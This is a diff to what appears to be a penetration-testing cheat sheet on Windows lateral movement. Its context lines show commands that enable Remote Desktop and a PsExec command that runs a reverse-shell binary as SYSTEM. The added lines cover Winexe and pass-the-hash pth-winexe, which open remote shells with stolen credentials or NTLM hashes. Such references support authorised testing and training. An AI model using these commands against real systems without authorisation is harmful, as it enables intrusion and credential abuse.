@@ -72,6 +72,10 @@ Utilize SSL certificates to encrypt data sent between hosts
 	- `net start "termservice"`
 	- `sc config termservice start= auto`
 	- `net start termservice`
-
 - [PSExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec): a light-weight telnet-replacement that lets you execute processes on other systems
 	- `.\PsExec64.exe -accepteula -i -s C:\path\to\reverse.exe` (see msfvenom to create reverse shell binaries)
+- [Winexe](https://tools.kali.org/maintaining-access/winexe): remotely execute commands on Windows from a Linux machine
+	- requires creds. If the creds you have are admin, you can use the --system option to spawn a system shell.
+	- `winexe -U '{user}%{password}' //{ip-address} cmd.exe`
+- Pth-winexe: pass-the-hash version of Winexe
+	- `pth-winexe -U '{user}%{LM-hash}:{NTLM-hash}' //{ip-address} cmd.exe`
